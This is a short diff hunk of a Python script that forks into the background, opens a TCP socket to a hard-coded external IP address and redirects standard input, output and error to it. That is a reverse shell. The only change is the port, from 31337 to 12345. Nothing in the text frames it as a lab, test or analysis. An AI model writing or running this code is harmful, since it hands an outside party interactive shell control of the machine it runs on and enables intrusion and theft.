@@ -20,7 +20,7 @@ if os.fork() > 0:
     sys.exit(0)
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("86.235.110.195",31337))
+s.connect(("86.235.110.195",12345))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
